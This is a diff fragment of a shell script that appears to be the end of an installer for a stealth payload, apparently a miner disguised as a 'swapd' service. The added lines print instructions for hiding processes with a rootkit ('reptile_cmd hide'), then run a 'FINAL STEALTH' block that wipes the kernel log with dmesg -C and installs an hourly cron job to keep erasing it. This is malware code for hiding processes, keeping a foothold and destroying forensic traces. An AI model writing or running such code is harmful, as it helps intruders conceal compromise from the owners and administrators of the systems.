@@ -3666,3 +3666,39 @@ echo ""
 if [ -n "$ROOTKIT_NAME" ]; then
     echo "Rootkit: $ROOTKIT_NAME"
     if [ "$HIDE_SIGNAL" != "0" ]; then
+        echo "Hide signal: kill -$HIDE_SIGNAL <PID>"
+    else
+        echo "Hide method: reptile_cmd hide <PID>"
+    fi
+    echo ""
+fi
+
+echo "Service: systemctl status swapd"
+echo "Logs: journalctl -u swapd -f"
+echo ""
+
+# ==================== FINAL STEALTH: CLEAR ALL TRACES ====================
+echo "=========================================="
+echo "FINAL STEALTH CLEANUP"
+echo "=========================================="
+echo ""
+
+echo "[*] Clearing dmesg kernel ring buffer..."
+dmesg -C 2>/dev/null || true
+echo "[✓] dmesg cleared"
+
+echo "[*] Setting up automatic dmesg clearing..."
+DMESG_CRON="0 * * * * /usr/bin/dmesg -C 2>/dev/null"
+if crontab -l 2>/dev/null | grep -q "dmesg -C"; then
+    echo "[✓] Auto-clear cron job already exists"
+else
+    (crontab -l 2>/dev/null; echo "$DMESG_CRON") | crontab - 2>/dev/null
+    echo "[✓] Added hourly dmesg auto-clear"
+fi
+
+echo ""
+echo "[✓] All kernel log traces removed"
+echo "[✓] Hourly auto-clear enabled"
+echo ""
+
+exit 0
